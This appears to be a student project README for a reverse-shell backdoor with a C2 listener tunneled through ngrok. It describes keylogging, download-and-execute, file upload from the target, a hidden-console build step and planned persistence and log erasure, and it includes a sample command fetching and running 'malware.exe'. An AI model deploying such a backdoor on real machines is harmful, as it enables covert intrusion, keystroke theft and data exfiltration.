# Adv Topics in CS Project: Milestone 2 - Reverse Backdoor C2 Framework

A cross-platform reverse shell backdoor designed for controlled penetration testing and security tool evaluation. 

The system consists of a Listener (C2 server) running on the attacker's MacBook and a Payload running on the target machine. Communication is established via a reverse TCP connection tunneled through ngrok, allowing the target to connect from anywhere on the internet without opening inbound ports.

## Project Goals
1. User needs to open a port, and the target connects to it (target can be anyone on the internet - does not need to be in a local network) - Implemented
  - Test connection not in a local network
2. The ability to use commands in terminal - Implemented
  - Similar to the Milestone 1 project - use of shell commands (or the equivalent)
3. Counter some firewalls (use ngrok: reference - https://isc.sans.edu/diary/26866) - Implemented
  - Reference the resource to create a c2 server using ngrok 
4. Get keyboard input - Implemented
  - Function recording all keyboard inputs. 
  - Use pynput library
  - Reference - https://omomuki-tech.com/archives/1406
5. Download, execute, and execute files - Implemented
  - Function that download specified file to target's computer and execute that file when given admin access
  - Function that allows to upload an accessible file from the target's computer from the user.
6. *Hide the presence - reopens when targets computer is rebooted - Remaining
  - Using alias names
  - Erase logs
  - Steganography

## How to Use

### 1. Start the C2 Server (Listener)
On your MacBook (Attacker), start the tunnel and the listener:

#### Terminal 1: Start ngrok
```bash
 ngrok tcp 4444
```
Note: With the free plan, the assigned ngrok address and port may change each time you start a new tunnel. Always update `backdoor.py` with the latest values from the ngrok output.
#### Terminal 2: Start the Python listener
```bash
python listener.py
```
### 2. Configure and Start the Payload
Update the address and port variables in backdoor.py with the values provided by your active ngrok session, then run:
```powershell
python backdoor.py
```

## Troubleshooting
- **Ngrok Tunnel Issues**: Ensure ngrok is installed and running. If the tunnel fails, check your internet connection and ngrok account status. Note that free plan tunnels varies and may change address/port on restart.
- **Connection Failures**: Verify the address and port in `backdoor.py` match the ngrok output. Firewalls may block connections; try a different port.
- **Keylogging Not Working**: pynput may have limitations on certain platforms (e.g., requires GUI on Linux/Mac). Ensure the target has a display.
- **Command Execution Errors**: Some commands may require admin privileges or differ by OS (e.g., `dir` on Windows vs. `ls` on Unix).
- **File Upload/Download Failures**: Check file permissions on the target machine.

## Available Commands

| Command | Description |
| :--- | :--- |
| Shell Commands | Any native command (dir, ipconfig, whoami, etc.) |
| KEYLOG_START | Begins recording keystrokes on the target. |
| KEYLOG_STOP | Stops the keylogger and sends the log to the listener. |
| DOWNLOAD:<url> | Downloads a file from a URL to the target machine. |
| DOWNLOAD:<url> -e | Downloads and automatically executes the file. |
| UPLOAD:<filename> | Uploads a file from the target machine to the attacker. |

### Usage Examples
- Send a command to all clients: `/all whoami`
- Target a specific client: `/127.0.0.1:59221 dir`
- Start keylogging: `/all KEYLOG_START`
- Download and execute a file: `/all DOWNLOAD:http://example.com/malware.exe -e`

## Project Structure
```
backdoor/
├── listener.py          # C2 Server (Attacker side)
├── backdoor.py          # Payload (Target side)
└── README.md            # Documentation
```

## Dependencies & Setup
* Python: 3.8+ 
* Ngrok: Download from [ngrok.com](https://ngrok.com/download). Sign up for a free account to use persistent tunnels if needed.
* External Libraries: pynput (used for keylogging)
```bash
pip install pynput pyinstaller
```
* Compilation: To turn the payload into an .exe:
```powershell
  pyinstaller --onefile --hidden-import=pynput.keyboard --noconsole backdoor.py
```

## Limitations & Known Issues
- Keylogging is not supported on all platforms (e.g., limited on headless Linux/Mac systems without X11).
- File upload/download may fail due to permission restrictions on the target.
- Shell commands may vary by OS; some require elevated privileges.
- Ngrok free tier has limitations on concurrent connections and tunnel persistence.

## Architecture
The system uses a reverse TCP connection: the payload (backdoor.py) initiates the connection to the listener via an ngrok tunnel. Commands are sent from the listener to the payload, executed on the target, and results are sent back. This allows the target to connect outbound without requiring open inbound ports.

## Version & Changelog
- **Version 2.0** (Milestone 2) - April 2026: Added keylogging, file download/upload, cross-platform support.
- Future: Implement persistence on reboot.

## Security & Legal Note
This tool is intended ONLY for authorized penetration testing and security research. Unauthorized use against systems without explicit permission is illegal. 

Last Updated: April 13, 2026